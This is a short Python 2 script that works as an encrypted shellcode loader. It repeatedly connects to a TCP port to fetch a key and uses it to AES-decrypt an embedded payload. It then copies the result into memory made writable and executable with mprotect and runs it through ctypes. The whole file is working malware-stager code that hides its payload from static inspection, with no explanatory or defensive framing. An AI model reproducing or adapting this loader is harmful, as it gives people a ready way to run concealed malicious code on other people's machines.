import socket
import time
from AESCipher import *
from ctypes import *
import sys
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import os
libc = CDLL('libc.so.6')
if os.name == 'nt':
    libc = CDLL(' msvcrt.dll')

buf = "\x36\x32\x56\x45\x51\x55\x70\x45\x57\x42\x79\x54\x69\x6d\x4f\x69\x73\x6a\x55\x74\x64\x62\x77\x78\x54\x6c\x4d\x6c\x45\x59\x35\x54\x43\x57\x36\x69\x50\x46\x46\x36\x55\x59\x57\x6d\x51\x71\x6d\x4a\x46\x35\x65\x4c\x62\x6a\x41\x61\x2f\x31\x6a\x75\x61\x49\x30\x54\x47\x57\x47\x4c\x5a\x4c\x78\x41\x42\x72\x57\x4f\x51\x61\x31\x4b\x53\x6a\x79\x57\x69\x70\x56\x31\x37\x37\x79\x46\x79\x44\x32\x4b\x72\x30\x42\x47\x48\x59\x47\x45\x53\x43\x47\x66\x2f\x68\x73\x6e\x51\x63\x6c\x59\x47\x4d\x79\x57\x37\x4e\x4e\x57\x4d\x2f\x7a\x2f\x68\x53\x4d\x52\x74\x42\x49\x4c\x71\x67\x50\x54\x65\x42\x6f\x53\x56\x32\x34\x51\x2b\x67\x3d\x3d"

time_to_wait = 3
target_ip = '127.0.0.1'
target_port = 4499

while True:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            time.sleep(1)
            client.connect((target_ip, target_port))
            print 'Successfully Connected'
            break
        except Exception, e:
            print e
    key = ""
    while True:
        data = client.recv(1024)
        if data:
            key += data
        else:
            break
    client.close()

    key = key.rstrip()

    aes = AESCipher(key)
    decrypted = aes.decrypt(buf)
    if decrypted.endswith('\x90'):
        print "Decryption successful!"
        print "Decrypted: %s" % print_in_hex(decrypted)
        sc = c_char_p(decrypted)
        size = len(decrypted)
        addr = c_void_p(libc.valloc(size))
        memmove(addr, sc, size)
        libc.mprotect(addr, size, 0x7)
        run = cast(addr, CFUNCTYPE(c_void_p))
        run()
        sys.exit(0)
    else:
        print "Decryption not successful! retrying in %d secs" % time_to_wait
        time.sleep(time_to_wait)
